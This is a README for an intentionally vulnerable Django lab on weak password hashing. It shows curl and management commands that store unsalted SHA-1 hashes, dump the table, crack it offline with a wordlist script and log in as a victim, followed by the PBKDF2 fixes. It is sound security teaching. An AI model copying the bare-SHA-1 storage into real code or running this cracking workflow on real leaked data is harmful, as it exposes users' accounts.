# Lab 18 — Weak Password Hashing

Companion lab for the blog post
**[Weak Password Hashing](https://thiagoteixeira.tech/blog/)** *(link finalised on publication)*.

| | |
|---|---|
| **OWASP** | A04:2025 — Cryptographic Failures |
| **CWE** | CWE-916 — Use of Password Hash With Insufficient Computational Effort · CWE-759 — Use of a One-Way Hash without a Salt |
| **ASVS** | V2.4.1 — passwords stored in a form resistant to offline attacks, salted and hashed with an approved one-way key derivation or password hashing function |
| **ATT&CK** | T1110.002 — Brute Force: Password Cracking |
| **Detection** | *Captured in [`scans/`](scans/) once the module is committed.* |

> ⚠️ Intentionally vulnerable. Run locally / in the provided Docker stack only. See [SECURITY.md](../../SECURITY.md).

## The attack

A password hash matters on one day: the day the table leaks. From then on the
attacker holds every row and guesses offline, on their own hardware, where no rate
limit, lockout or log entry can see them. Two properties of the stored value
decide how far that goes: how fast the function is, and whether each row has its
own salt. A bare SHA-1 digest fails both. Each guess costs one SHA-1, and is
checked against **every** row at once, because the same password gives the same
40 characters everywhere.

## The files

| | File | What it does |
|---|---|---|
| Vulnerable | [`views_vulnerable.py`](views_vulnerable.py) | `register` writes `hashlib.sha1(password.encode()).hexdigest()` into `User.password`; `login` checks it with [`SHA1Backend`](backends.py), because Django's own login cannot |
| Secure | [`views_secure.py`](views_secure.py) | `register` calls `user.set_password(password)`. No login of its own: the shared `/accounts/login/` (Django's `ModelBackend`) checks what `set_password()` writes |
| The rows already stored | [`hashers.py`](hashers.py), [`wrap.py`](wrap.py), [`migrations/0002_wrap_sha1_hashes.py`](migrations/0002_wrap_sha1_hashes.py) | `PBKDF2WrappedSHA1PasswordHasher` and the data migration that wraps every bare digest in PBKDF2 without knowing a password (Django's documented MD5 recipe, for SHA-1). `manage.py wrap_sha1_hashes` runs the same function on demand |
| The leak | [`management/commands/dump_password_table.py`](management/commands/dump_password_table.py) | prints `auth_user`'s username and password columns as CSV, the copy an attacker ends up with |
| The attacker | [`crack.py`](crack.py) | standard library only; cracks the dump against a wordlist — Django's own 19,640-entry `common-passwords.txt.gz` by default |
| The prize | [`views_note.py`](views_note.py) | `/hashing/note/` shows the signed-in user's notes; **carla's** holds the flag |

`SHA1Backend` is not in `AUTHENTICATION_BACKENDS`: that setting is global, and it
would let SHA-1 rows in through every lab's login. Only the vulnerable login view
calls it. In a real project it would sit in the setting, which is how this mistake
usually looks.

## Why `october12`

The seed imports two "legacy" accounts, **carla** and **davi**, with the same
password stored the vulnerable way. That password is `october12`, guess **11,007**
of Django's common-passwords list. It is deliberately not `123456`: a password at
the top of every list falls on the first guess to any hasher, however slow, and
that is Lab 13's subject. The hasher decides the fate of the passwords further
down, so the victims sit further down.

## Run it

From the repository root (the folder with `docker-compose.yml`):

```bash
docker compose up -d          # Postgres + Django on http://127.0.0.1:8000 (background)
```

`up` runs `migrate` and `seed_labs`, which (re)seeds carla and davi as unsalted
SHA-1 rows and gives carla a note holding the flag. On Windows PowerShell, `curl`
is an alias for `Invoke-WebRequest`; use `curl.exe`, or Git Bash.

## Exploit it from the command line

**1. The VULNERABLE sign-up stores a bare SHA-1.**

```bash
curl -s -d 'username=hugo&password=october12' \
     http://127.0.0.1:8000/hashing/vulnerable/register/
# registered hugo (SHA-1, no salt)                 [HTTP 201]
```

**2. The table leaks.** How it leaves the building (a SQL injection, a backup in
a bucket, a stolen VPN login) is not this lab's subject; the copy is:

```bash
docker compose exec -T web python manage.py dump_password_table > leak.csv
grep -E '^(alice|carla|davi|hugo),' leak.csv
# alice,pbkdf2_sha256$1000000$5LTlCfrvvsSWeYTmCv1IMi$J1TB1lgZqMt285D/rlmxcp690jZydWxxEfg8bgzhH+0=
# carla,66e5d363fe272fbf3486695d2111921764d26e59
# davi,66e5d363fe272fbf3486695d2111921764d26e59
# hugo,66e5d363fe272fbf3486695d2111921764d26e59
```

Three accounts, one hash: the attacker knows they share a password before
cracking anything. alice's row is what `set_password()` writes, for contrast.

**3. Crack it, offline.** One pass of the wordlist for every SHA-1 row at once:

```bash
docker compose exec -T web python labs/post_18_password_hashing/crack.py - < leak.csv
# leak: 11 rows, 3 unsalted SHA-1 (1 distinct), 8 salted PBKDF2, 0 other; wordlist: 19,640 guesses
# unsalted SHA-1: one pass for all 3 rows, 11,007 guesses in 5.5 ms
#   october12  carla, davi, hugo
# salted PBKDF2: 8 rows not attempted; every guess is a full PBKDF2 run for one row (name rows with --user)
```

**4. Use it.** Log in as carla through the vulnerable login and read her note:

```bash
curl -s -c atk.txt -d 'username=carla&password=october12' \
     http://127.0.0.1:8000/hashing/vulnerable/login/
# logged in as carla                               [HTTP 200]
curl -s -b atk.txt http://127.0.0.1:8000/hashing/note/
# <h1>carla's notes</h1><ul><li>private: FLAG{unsalted_sha1_cracked_offline}</li></ul>
```

Django's own login refuses the same credentials, because it cannot check a bare
digest (`check_password()` finds no hasher prefix and returns `False`), which is
why the vulnerable project needed its own backend:

```bash
curl -s -d 'username=carla&password=october12' http://127.0.0.1:8000/accounts/login/
# invalid credentials                              [HTTP 401]
```

## The fix, part 1 — `set_password()`

**5. The SECURE sign-up, with the same password, twice:**

```bash
curl -s -d 'username=elisa&password=october12' http://127.0.0.1:8000/hashing/secure/register/
# registered elisa (PBKDF2, salted)                [HTTP 201]
curl -s -d 'username=fabio&password=october12' http://127.0.0.1:8000/hashing/secure/register/
# registered fabio (PBKDF2, salted)                [HTTP 201]
docker compose exec -T web python manage.py dump_password_table > leak2.csv
grep -E '^(elisa|fabio),' leak2.csv
# elisa,pbkdf2_sha256$1000000$kgv7cHsZ9UfxXGRy7MosFf$8ElopDX1XkpZMq3seurE6bAVYPve8PdI5Akk8bgGaD8=
# fabio,pbkdf2_sha256$1000000$nYYZGW0pnONiTDVwdo3MVQ$DHNTJ/fR5qIAbV4iIvNw8Z4Ta9gLxCpbXjkrTQEbeJM=
```

Same password, different rows: algorithm, a million iterations, a 22-character
salt of its own, the hash.

**6. The same attack against elisa's row**, given ten seconds:

```bash
docker compose exec -T web python labs/post_18_password_hashing/crack.py - --user elisa --budget 10 < leak2.csv
# ...
#   elisa (pbkdf2_sha256, 1,000,000 iterations): not found in 10.1 s (79 guesses, 7.9 a second); the whole list would take about 42 min for this one account
```

Eleven thousand guesses that took 5 ms for every SHA-1 row together now take
about 23 minutes for elisa alone, then start again from zero for fabio. That is a
19,640-word list on one CPU core; against `rockyou.txt` (14.3 million entries) the
same arithmetic gives about three weeks per account. A GPU is much faster at both
hashes; the ratio is what stays. `set_password()` makes the guess slow and the salt
makes it per account. A weak password still falls if it is in the list, only later
(`tests.py::test_a_salted_row_still_falls_to_a_guess_that_is_in_the_list`).

## The fix, part 2 — the rows already in the table

Fixing the sign-up leaves carla, davi and hugo as they were, and a row only
upgrades when its owner logs in again. The wrap migration converts them all,
without a password:

```bash
docker compose exec -T web python manage.py wrap_sha1_hashes
# wrapped 3 SHA-1 row(s) in PBKDF2
docker compose exec -T web python manage.py dump_password_table > leak3.csv
docker compose exec -T web python labs/post_18_password_hashing/crack.py - < leak3.csv
# leak: 13 rows, 0 unsalted SHA-1 (0 distinct), 13 salted PBKDF2, 0 other; wordlist: 19,640 guesses
# salted PBKDF2: 13 rows not attempted; every guess is a full PBKDF2 run for one row (name rows with --user)
```

`config/settings.py` lists the wrapped hasher after Django's default, so Django's
login now accepts carla, and on that correct login `check_password()` re-hashes
her password with plain PBKDF2:

```bash
curl -s -d 'username=carla&password=october12' http://127.0.0.1:8000/accounts/login/
# logged in as carla                               [HTTP 200]
docker compose exec -T web python manage.py dump_password_table | grep '^carla,'
# carla,pbkdf2_sha256$1000000$moNXbuzsdoWp13ZGcc7xWu$8qVcmaojDGvdZXz+aDSOBB38DoC+Xvb5646VobFy7Zw=
```

**Wrapping does nothing for a leak that already happened.** The first copy still
cracks, and the password it yields still works, so after a known leak the
passwords themselves must be reset:

```bash
docker compose exec -T web python labs/post_18_password_hashing/crack.py - < leak.csv
# ...
#   october12  carla, davi, hugo
```

Re-running the walkthrough: `docker compose restart web` re-seeds carla and davi
as SHA-1 rows; hugo, elisa and fabio stay registered, so pick fresh usernames or
reset the stack with `docker compose down -v && docker compose up -d`.

Or prove all of it in one command (from the repo root):

```bash
docker compose run --rm web python manage.py test labs.post_18_password_hashing
# Ran 13 tests in 4.582s
# OK
```

## Isolation

This lab teaches offline cracking of a leaked unsalted, fast hash, and nothing
else. The other ways the same leak goes wrong are named in the post and not built
here: no `MD5PasswordHasher` (salted but fast) is configured, and the iteration
count is Django's default, which a test asserts by reading the stored row.
Credential stuffing with a cracked password is Lab 11's neighbourhood. The
secure sign-up validates nothing, because password strength is Lab 13. The leak
is a management command rather than an exploit, because SQL injection is Lab 1.
The note lookup is scoped to `request.user` (no IDOR, Lab 6) and escaped (no XSS,
Lab 2). Global CSRF is off in this project, so the POSTs need no token (Lab 8).

`PASSWORD_HASHERS` is global, and the lesson is that setting, so it lives in
`config/settings.py` as Django's default list, unchanged and in order, plus the
wrapped hasher at the end. New passwords in every lab still go to PBKDF2, and the
extra entry is consulted only for a stored value starting `pbkdf2_wrapped_sha1$`,
which no other lab writes.
`tests.py::test_the_hasher_list_is_djangos_default_plus_the_wrapper` holds that.

## Scanning it

*Captured with the detection pass once the module is committed; see [`scans/`](scans/).*
